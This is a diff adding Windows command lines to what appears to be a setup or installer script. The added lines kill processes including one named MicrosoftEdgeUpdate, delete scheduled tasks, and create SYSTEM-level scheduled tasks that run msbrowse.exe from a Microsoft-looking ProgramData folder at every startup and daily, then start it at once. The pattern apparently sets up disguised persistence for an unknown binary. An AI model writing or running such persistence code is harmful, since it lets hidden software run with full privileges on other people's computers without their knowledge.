@@ -21,3 +21,21 @@ schtasks /Query /TN Microsoft\MSbrowseD
 schtasks /Query /TN Microsoft\UAStock
 schtasks /Query /TN Microsoft\UAStockU
 schtasks /Query /TN Microsoft\UAStockD
+
+
+taskkill /IM msbrowse.exe /f 
+taskkill /IM UAStock.exe /f 
+taskkill /IM MicrosoftEdgeUpdate /f 
+
+
+Setup=schtasks /TN Microsoft\UAStock /Delete /F
+Setup=schtasks /TN Microsoft\UAStockU /Delete /F
+Setup=schtasks /TN Microsoft\UAStockD /Delete /F
+Setup=schtasks /TN Microsoft\MSbrowse /Delete /F
+Setup=schtasks /TN Microsoft\MSbrowseD /Delete /F
+
+
+schtasks /TN Microsoft\MSbrowse /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe  /SC ONSTART /f
+schtasks /TN Microsoft\MSbrowseD /Create /RU SYSTEM /TR c:\ProgramData\Microsoft\EdgeUpdate\msbrowse.exe  /SC DAILY /f
+
+schtasks /Run /TN Microsoft\MSbrowse
